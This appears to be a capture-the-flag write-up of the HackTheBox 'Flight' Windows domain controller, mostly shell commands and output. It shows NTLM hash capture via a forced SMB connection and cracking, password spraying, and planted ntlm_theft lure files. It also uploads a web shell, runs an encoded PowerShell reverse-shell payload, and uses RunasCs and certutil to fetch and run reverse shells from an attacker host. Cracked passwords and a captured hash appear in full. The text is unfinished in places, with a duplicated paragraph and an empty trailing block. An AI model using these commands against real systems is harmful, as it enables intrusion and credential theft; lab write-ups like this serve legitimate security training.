NMAP

In this section, we will perform a  nmap port scanning :
```bash
sudo nmap -sC -sV   10.129.228.120 --open 
```

```output
3/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-28 01:37:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped

```

```bash
nxc smb 10.129.228.120                              
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
           
```

```bash
cat /etc/hosts
10.129.228.120      G0  G0.flight.htb flight.htb 
```

## DNS Enumeration

In this section, we are going to query all dns records and perform a dns zone transfer :

```bash
dig axfr flight.htb @10.129.228.120   

; <<>> DiG 9.20.7-1-Debian <<>> axfr flight.htb @10.129.228.120
;; global options: +cmd
; Transfer failed.
```

Let’s query all the dns records :

```bash
dig any flight.htb @10.129.228.120  

; <<>> DiG 9.20.7-1-Debian <<>> any flight.htb @10.129.228.120
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 22258
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;flight.htb.                    IN      ANY

;; ANSWER SECTION:
flight.htb.             600     IN      A       10.129.228.120
flight.htb.             600     IN      A       192.168.22.180
flight.htb.             3600    IN      NS      g0.flight.htb.
flight.htb.             3600    IN      SOA     g0.flight.htb. hostmaster.flight.htb. 58 900 600 86400 3600
flight.htb.             600     IN      AAAA    dead:beef::459a:a3e2:9dc2:b376
flight.htb.             600     IN      AAAA    dead:beef::23d

;; ADDITIONAL SECTION:
g0.flight.htb.          1200    IN      A       10.129.228.120
g0.flight.htb.          1200    IN      AAAA    dead:beef::459a:a3e2:9dc2:b376

;; Query time: 32 msec
;; SERVER: 10.129.228.120#53(10.129.228.120) (TCP)
;; WHEN: Mon Oct 27 14:48:58 EDT 2025


```


## Web server Enumeration

Let’s start by taking a quick look at the different features of the website :


![BloodHound Analysis](images/sauna1.png)

This seems to be a static page and it will not be useful. Let’s keep on our enumeration :

### Web technologies profiling
The website is running on Apache webserver and is using PHP. After some research, I found no interesting vulnerabilities that affected those technologies.
```bash
whatweb  -a 3 flight.htb                                              
http://flight.htb [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1], IP[10.129.228.120], JQuery[1.4.2], OpenSSL[1.1.1m], PHP[8.1.1], Script[text/javascript], Title[g0 Aviation]                                                                          
```



### Directory fuzzing

Here again, nothing of interest was found. Let’s try to perform virtual hosts fuzzing.

```bash
ffuf -ic -c -recursion -recursion-depth 2 -w /usr/share/seclists/Discovery/Web-Content/common.txt  -u http://flight.htb/FUZZ 

```

nothing interesting
```output
:: Method           : GET
 :: URL              : http://flight.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 299, Words: 22, Lines: 10, Duration: 24ms]
.hta                    [Status: 403, Size: 299, Words: 22, Lines: 10, Duration: 28ms]
.htaccess               [Status: 403, Size: 299, Words: 22, Lines: 10, Duration: 28ms]

```

### Virtual hosts fuzzing
Wonderful ! We found a new virtual host : **school.flight.htb**

```bash
ffuf -ic -c  -w /usr/share/seclists/Discovery/Web-Content/common.txt  -u http://flight.htb -H 'HOST: FUZZ.flight.htb' -fs 7069
```

```bash
:: Method           : GET
 :: URL              : http://flight.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7069
________________________________________________

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 43ms]
:: Progress: [4744/4744] :: Job [1/1] :: 1169 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
                                                                          

```

Let’s add it to our hosts file :

```bash
cat  /etc/hosts
10.129.228.120      G0  G0.flight.htb  school.flight.htb       flight.htb 
```

We will repeat the same enumeration as we did above for the new virtual host :

![[Pasted image 20251027191901.png]]

As you can see, the **view** parameter seems to display the content of a page.

This is an old method used by web developers to display the content of web pages. When seeing such things, I generally think of directory path transversal and file inclusions (LFI, RFI) attacks. Let’s check that

![[Pasted image 20251027192036.png]]

t seems that there are some sort of filtering put in place by the server. Let’s see if this was implemented on the server or client side ?

When replacing blog.html with index.php in the view parameter, I came across this :

![[Pasted image 20251027192221.png]]

Indeed, the server is performing some filtering on its side as highlighted on the image above.

![[Pasted image 20251027192536.png]]

### Remote File Inclusion

If we think a little bit outside the box, we must find another solution that might work pretty well here. From previous enumeration, we already know that we have a Windows host with SMB running on it. What if we tell the web server to connect to a share on our machine ? Well, if everything goes fine, it should normally try to authenticate to our SMB server and we must be able to capture its Net-NTLMv2 hash and then crack it.

Enough said ! Let’s walk the talk :

**1/ Launching an SMB server**

![[Pasted image 20251027193531.png]]

**2/ Forcing the web server to connect to our SMB server**

![[Pasted image 20251027193610.png]]

**Note :** I did not use back slashes because it is blocked by the web server.

**3/ Intercepting the web server user’s Net-NTLMv2 hash**

Let’s try to crack the intercepted hash using hashcat :

```bash
hashcat svc_apache-net-ntlmv2 /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20251027193647.png]]

we get  apassword

Great ! We found our first pair of credentials. Let’s see where we can authenticate with this

```bash
netexec smb  10.129.228.120   -d FLight.htb -u svc_apache -p 'S@Ss!K@*t13'
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.228.120  445    G0               [+] FLight.htb\svc_apache:S@Ss!K@*t13 
                        
```


we cant winrm

```bash
netexec winrm  10.129.228.120   -d FLight.htb -u svc_apache -p 'S@Ss!K@*t13'
WINRM       10.129.228.120  5985   G0               [*] Windows 10 / Server 2019 Build 17763 (name:G0) (domain:flight.htb)
WINRM       10.129.228.120  5985   G0               [-] FLight.htb\svc_apache:S@Ss!K@*t13
                                                                
```


```bash
 netexec smb   10.129.228.120   -u svc_apache -p 'S@Ss!K@*t13' --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ            
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ            
                                            

```

### Password Spray

#### List Domain Users

I was able to get another user name, C.Bum, from the `users` share, but there may be more domain users. I’ll use `lookupsid.py` from [Impacket](https://github.com/SecureAuthCorp/impacket) to get a list of more:

```bash
lookupsid.py flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb
```

```bash
1602: flight\S.Moon (SidTypeUser)
1603: flight\R.Cold (SidTypeUser)
1604: flight\G.Lors (SidTypeUser)
1605: flight\L.Kein (SidTypeUser)
1606: flight\M.Gold (SidTypeUser)
1607: flight\C.Bum (SidTypeUser)
1608: flight\W.Walker (SidTypeUser)
1609: flight\I.Francis (SidTypeUser)
1610: flight\D.Truff (SidTypeUser)
1611: flight\V.Stevens (SidTypeUser)
1612: flight\svc_apache (SidTypeUser)
1613: flight\O.Possum (SidTypeUser)
1614: flight\WebDevs (SidTypeGroup)
                                     

```


we make a clean user.txt
```bash
cat users.txt | awk '{split($2,a,"\\"); print a[2]}'>all_user.txt
```

#### Spray

It’s not uncommon for someone in charge of a service account to reuse their password with that service account. I’ll see if any of the accounts above share that password with `crackmapexec`. I always like to use the `--continue-on-success` in case more than one match

```bash
 netexec smb   10.129.228.120   -u all_user.txt -p 'S@Ss!K@*t13' --continue-on-success
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\WebDevs:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
                                                     

```

```bash
netexec smb   10.129.228.120   -u S.Moon -p 'S@Ss!K@*t13'                      
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
```

## Auth as C.Bum

### SMB

In addition to the read access, S.Moon has write access to `Shared`:

```bash
netexec smb   10.129.228.120   -u S.Moon -p 'S@Ss!K@*t13'  --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ            
                                                                  

```

i will use ntlmtheft
```bash
sudo python ntlm_theft.py --verbose --generate modern --server "10.10.16.32" --filename "important-note" -g all

```

lets start responder
```bash
sudo responder -I tun0
```


Connecting from the directory with the `ntlm_theft` output, I’ll upload all of them to the share:
```bash
 smbclient //flight.htb/shared -U S.Moon 'S@Ss!K@*t13'

smb: \> prompt false 
smb: \> mput *

```
Interestingly, a bunch are blocked. But a few do make it.

#### Responder

With `responder` still running, after a minute or two there’s a hit from C.Bum:

```bash
c.bum::flight.htb:255ad764d29dc4e4:4900A950F07098D1CFC7CCB5DBBFBCA8:010100000000000080C40DAD6247DC01795FE9B8AB00BC0E00000000020008004300530046004F0001001E00570049004E002D00410030004B003000380049005100440038003000320004003400570049004E002D00410030004B00300038004900510044003800300032002E004300530046004F002E004C004F00430041004C00030014004300530046004F002E004C004F00430041004C00050014004300530046004F002E004C004F00430041004C000700080080C40DAD6247DC01060004000200000008003000300000000000000000000000003000000B3C0BD920C6990512843E8E36345F96874777E1D7A0E9D67A31E56DA23C3E940A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330032000000000000000000

```

### Crack NetNTLMv2

`hashcat` with `rockyou` will quickly return the password “Tikkycoll_431012284”:

```bash
john  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt                  

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Tikkycoll_431012284 (c.bum)     
1g 0:00:00:34 DONE (2025-10-27 17:06) 0.02901g/s 305684p/s 305684c/s 305684C/s Timber06..Tiffani29
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
                                              

```

it works:

```bash
netexec smb 10.129.228.120  -u c.bum  -p Tikkycoll_431012284   

SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.228.120  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
                                                  

```

Interesting ! We have write access to the **Web** share. This means that we could potentially upload a reverse shell or web shell on the server and obtain a shell. Here I used [p0wny shell](https://github.com/flozz/p0wny-shell)
```bash
smbclient.py 'flight.htb/c.bum:Tikkycoll_431012284'@10.129.228.120 

# use web
# ls
drw-rw-rw-          0  Tue Oct 28 00:27:00 2025 .
drw-rw-rw-          0  Tue Oct 28 00:27:00 2025 ..
drw-rw-rw-          0  Tue Oct 28 00:27:00 2025 flight.htb
drw-rw-rw-          0  Tue Oct 28 00:27:00 2025 school.flight.htb
# cd school.flight.htb
# 
# put shell.php
```

![[Pasted image 20251027214147.png]]

nteresting ! We have write access to the **Web** share. This means that we could potentially upload a reverse shell or web shell on the server and obtain a shell. Here I used [p0wny shell](https://github.com/flozz/p0wny-shell) :

Press enter or click to view image in full size

```bash
(myenv)─(kali㉿kali)-[/opt/impacket/examples/hoaxshell]
└─$ python  hoaxshell.py -s 10.10.16.32 -p 9999


    ┬ ┬ ┌─┐ ┌─┐ ─┐ ┬ ┌─┐ ┬ ┬ ┌─┐ ┬   ┬  
    ├─┤ │ │ ├─┤ ┌┴┬┘ └─┐ ├─┤ ├┤  │   │                                                                                                                                                       
    ┴ ┴ └─┘ ┴ ┴ ┴ └─ └─┘ ┴ ┴ └─┘ ┴─┘ ┴─┘                                                                                                                                                     
                           by t3l3machus                                                                                                                                                     

[Info] Generating reverse shell payload...
powershell -e JABzAD0AJwAxADAALgAxADAALgAxADYALgAzADIAOgA5ADkAOQA5ACcAOwAkAGkAPQAnADkANwAwADQAZQAxADMAYwAtADAANQA3AGEAMAA1ADMAMwAtADAAOQBiADQAMwA2ADcANQAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwA5ADcAMAA0AGUAMQAzAGMAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AYQA2ADkAZQAtADQANgAzAGUAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AMAA1ADcAYQAwADUAMwAzACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGEANgA5AGUALQA0ADYAMwBlACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwACQAcwAvADAAOQBiADQAMwA2ADcANQAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGEANgA5AGUALQA0ADYAMwBlACIAPQAkAGkAfQAgAC0AQgBvAGQAeQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZQArACQAcgApACAALQBqAG8AaQBuACAAJwAgACcAKQB9ACAAcwBsAGUAZQBwACAAMAAuADgAfQA=                                                                                                                              
[Info] Type "help" to get a list of the available prompt commands.
[Info] Http Server started on port 9999.
[Important] Awaiting payload execution to initiate shell session.

```


![[Pasted image 20251027221234.png]]

```bash
oaxshell > whoami
[Info] No active session.
[Shell] Payload execution verified!
[Shell] Stabilizing command prompt...

PS C:\xampp\htdocs\school.flight.htb >

```

```bash
PS C:\xampp\htdocs\school.flight.htb > dir c:/
Directory: C:                                                                                
Mode                LastWriteTime         Length Name                                                                                                                                        
----                -------------         ------ ----                                                                                                                                        
d-----       10/29/2025   7:07 AM                inetpub                                                                                                                                     
d-----         6/7/2022   6:39 AM                PerfLogs                                                                                                                                    
d-r---       10/21/2022  11:49 AM                Program Files                                                                                                                               
d-----        7/20/2021  12:23 PM                Program Files (x86)                                                                                                                         
d-----       10/28/2022   1:21 PM                Shared                                                                                                                                      
d-----        9/22/2022  12:28 PM                StorageReports                                                                                                                              
d-r---        9/22/2022   1:16 PM                Users                                                                                                                                       
d-----       10/21/2022  11:52 AM                Windows                                                                                                                                     
d-----        9/22/2022   1:16 PM                xampp 

```

```bash
PS C:\xampp\htdocs\school.flight.htb > dir C:\inetpub
Directory: C:\inetpub 
Mode                LastWriteTime         Length Name                                                                                                                                        
----                -------------         ------ ----                                                                                                                                        
d-----        9/22/2022  12:24 PM                custerr                                                                                                                                     
d-----       10/29/2025   7:12 AM                development                                                                                                                                 
d-----        9/22/2022   1:08 PM                history                                                                                                                                     
d-----        9/22/2022  12:32 PM                logs                                                                                                                                        
d-----        9/22/2022  12:24 PM                temp                                                                                                                                        
d-----        9/22/2022  12:28 PM                wwwroot                                                                                                                                     
                                                                                                                                                                                             
PS C:\xampp\htdocs\school.flight.htb > dir C:\inetpub\wwwroot 
Directory: C:\inetpub\wwwroot                                                                  
Mode                LastWriteTime         Length Name                                                                                                                                        
----                -------------         ------ ----                                                                                                                                        
d-----        9/22/2022  12:28 PM                aspnet_client                                                                                                                               
-a----        9/22/2022  12:24 PM            703 iisstart.htm                                                                                                                                
-a----        9/22/2022  12:24 PM          99710 iisstart.png                                                                                                                                
                                                                            
PS C:\xampp\htdocs\school.flight.htb > dir C:\inetpub\development
Directory: C:\inetpub\development
                                                                                                      
Mode                LastWriteTime         Length Name                                                                                                                                        
----                -------------         ------ ----                                                                                                                                        
d-----       10/29/2025   7:12 AM                css                                                                                                                                         
d-----       10/29/2025   7:12 AM                fonts                                                                                                                                       
d-----       10/29/2025   7:12 AM                img                                                                                                                                         
d-----       10/29/2025   7:12 AM                js                                                                                                                                          
-a----        4/16/2018   2:23 PM           9371 contact.html                                                                                                                                
-a----        4/16/2018   2:23 PM          45949 index.html         

```


```bash
PS C:\xampp\htdocs\school.flight.htb > netstat -ano  | findstr 'LISTEN'
TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5296
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       656                                                                                                                   
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       924                                                                                                                   
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       656                                                                                                                   
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       5296                                                                                                                  
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4                                                                                                                     
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       656                                                                                                                   
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       924                                                                                                                   
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       656                                                                                                                   
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       656                                                                                                                   
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       656                                                                                                                   
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4                                                                                                                     
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4                                                                                                                     
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2944                                                                                                                  
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4                                                                                                                     
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       508                                                                                                                   
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1180                                                                                                                  
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1612                                                                                                                  
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       656                                                                                                                   
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       656                                                                                                                   
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       656                                                                                                                   
  TCP    0.0.0.0:49684          0.0.0.0:0              LISTENING       648                                                                                                                   
  TCP    0.0.0.0:49702          0.0.0.0:0              LISTENING       3000                                                                                                                  
  TCP    0.0.0.0:57790          0.0.0.0:0              LISTENING       3032                                                                                                                  
  TCP    10.129.195.239:53      0.0.0.0:0              LISTENING       3000                                                                                                                  
  TCP    10.129.195.239:139     0.0.0.0:0              LISTENING       4                                                                                                                     
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       3000                                                                                                                  
  TCP    [::]:80                [::]:0                 LISTENING       5296                                                                                                                  
  TCP    [::]:88                [::]:0                 LISTENING       656                                                                                                                   
  TCP    [::]:135               [::]:0                 LISTENING       924                                                                                                                   
  TCP    [::]:389               [::]:0                 LISTENING       656                                                                                                                   
  TCP    [::]:443               [::]:0                 LISTENING       5296                                                                                                                  
  TCP    [::]:445               [::]:0                 LISTENING       4                                                                                                                     
  TCP    [::]:464               [::]:0                 LISTENING       656                                                                                                                   
  TCP    [::]:593               [::]:0                 LISTENING       924                                                                                                                   
  TCP    [::]:636               [::]:0                 LISTENING       656                                                                                                                   
  TCP    [::]:3268              [::]:0                 LISTENING       656                                                                                                                   
  TCP    [::]:3269              [::]:0                 LISTENING       656                                                                                                                   
  TCP    [::]:5985              [::]:0                 LISTENING       4                                                                                                                     
  TCP    [::]:8000              [::]:0                 LISTENING       4                                                                                                                     
  TCP    [::]:9389              [::]:0                 LISTENING       2944                                                                                                                  
  TCP    [::]:47001             [::]:0                 LISTENING       4                                                                                                                     
  TCP    [::]:49664             [::]:0                 LISTENING       508                                                                                                                   
  TCP    [::]:49665             [::]:0                 LISTENING       1180                                                                                                                  
  TCP    [::]:49666             [::]:0                 LISTENING       1612                                                                                                                  
  TCP    [::]:49667             [::]:0                 LISTENING       656                                                                                                                   
  TCP    [::]:49673             [::]:0                 LISTENING       656                                                                                                                   
  TCP    [::]:49674             [::]:0                 LISTENING       656                                                                                                                   
  TCP    [::]:49684             [::]:0                 LISTENING       648                                                                                                                   
  TCP    [::]:49702             [::]:0                 LISTENING       3000                                                                                                                  
  TCP    [::]:57790             [::]:0                 LISTENING       3032                                                                                                                  
  TCP    [::1]:53               [::]:0                 LISTENING       3000                                                                                                                  
  TCP    [dead:beef::1085:21e6:3d65:c893]:53  [::]:0                 LISTENING       3000                                                                                                    
  TCP    [fe80::1085:21e6:3d65:c893%6]:53  [::]:0                 LISTENING       3000   

```


```bash
nc -zv flight.htb  8000                                            

G0 [10.129.195.239] 8000 (?) : Connection timed out
```

```bash
netsh advfirewall show allprofiles

Public Profile Settings:                                                                                                                                                                     
----------------------------------------------------------------------                                                                                                                       
State                                 ON                                                                                                                                                     
Firewall Policy                       BlockInbound,AllowOutbound                                                                                                                             
LocalFirewallRules                    N/A (GPO-store only)                                                                                                                                   
LocalConSecRules                      N/A (GPO-store only)                                                                                                                                   
InboundUserNotification               Disable                                                                                                                                                
RemoteManagement                      Disable                                                                                                                                                
UnicastResponseToMulticast            Enable                                                                                                                                                 
                                                                                               
Logging:                                                                                                                                                                                     
LogAllowedConnections                 Disable                                                                                                                                                
LogDroppedConnections                 Disable                                                                                                                                                
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log                                                                                                  
MaxFileSize                           4096                                                                                                                                                         
Ok.                             
```



```bash
PS C:\xampp\htdocs\school.flight.htb > curl http://localhost:8000

<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>                                                                                                                
<BODY><h2>Bad Request - Invalid Hostname</h2>                                                                                                                                                
<hr><p>HTTP Error 400. The request hostname is invalid.</p>                                                                                                                                  
</BODY></HTML>         

```

```bash
net user C.Bum
User name                    C.Bum
Full Name                                                                                                                                                                                    
Comment                      Senior Web Developer                                                                                                                                            
User's comment                                                                                                                                                                               
Country/region code          000 (System Default)                                                                                                                                            
Account active               Yes                                                                                                                                                             
Account expires              Never                                                                                                                                                           
                                                                                                                                                                                             
Password last set            9/22/2022 1:08:22 PM                                                                                                                                            
Password expires             Never                                                                                                                                                           
Password changeable          9/23/2022 1:08:22 PM                                                                                                                                            
Password required            Yes                                                                                                                                                             
User may change password     Yes                                                                                                                                                             
                                                                                                                                                                                             
Workstations allowed         All                                                                                                                                                             
Logon script                                                                                                                                                                                 
User profile                                                                                                                                                                                 
Home directory                                                                                                                                                                               
Last logon                   9/22/2022 2:50:24 PM                                                                                                                                            
                                                                                                                                                                                             
Logon hours allowed          All                                                                                                                                                             
                                                                                                                                                                                             
Local Group Memberships                                                                                                                                                                      
Global Group memberships     *Domain Users         *WebDevs                                                                                                                                  
The command completed successfully.                

```

```bash
python3 -m http.server 8001 --bind 0.0.0.0 &  
```

```bash
 powershell -c wget 10.10.16.12:8001/RunasCs.exe -outfile RunasCs.exe
```

```bash
 powershell -WindowStyle Hidden -Command "Start-Process 'RunasCs.exe' -ArgumentList 'C.Bum Tikkycoll_431012284 -r 10.10.16.12:443 cmd' -WindowStyle Hidden"

```


```bash
rlwrap -cAr nc -lnvp 443
C:\Users\C.Bum\Desktop>whoami
whoami
flight\c.bum
```

```bash
C:\Users\C.Bum\Desktop>type user.txt
type user.txt
f1d63f30c754ea5b367af7520575ea34
```


```bash
nohup ./chisel-linux server --reverse --socks5 -p 8000 > chisel.log 2>&1 &

```

```bash
powershell -WindowStyle Hidden -Command "Start-Process 'chisel-windows.exe' -ArgumentList 'client','10.10.16.12:8000','R:1080:socks','R:9001:127.0.0.1:8000' -WindowStyle Hidden"

```

![[Pasted image 20251029173744.png]]



```bash
C:\inetpub\development>echo "test" > wali.txt
```

![[Pasted image 20251029190408.png]]

```bash
certutil -urlcache -split -f http://10.10.16.12:8001/shell.aspx C:\inetpub\development\shell.aspx

```

```bash
rlwrap -cAr nc -lnvp 1234
listening on [any] 1234 ...
10.129.40.114 - - [29/Oct/2025 15:35:59] "GET /shell.aspx HTTP/1.1" 200 -
10.129.40.114 - - [29/Oct/2025 15:35:59] "GET /shell.aspx HTTP/1.1" 200 -
connect to [10.10.16.12] from (UNKNOWN) [10.129.40.114] 52265
Spawn Shell...
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>

```


```bash
c:\windows\system32\inetsrv>\\10.10.16.12\404
\\10.10.16.12\404

```

```bash
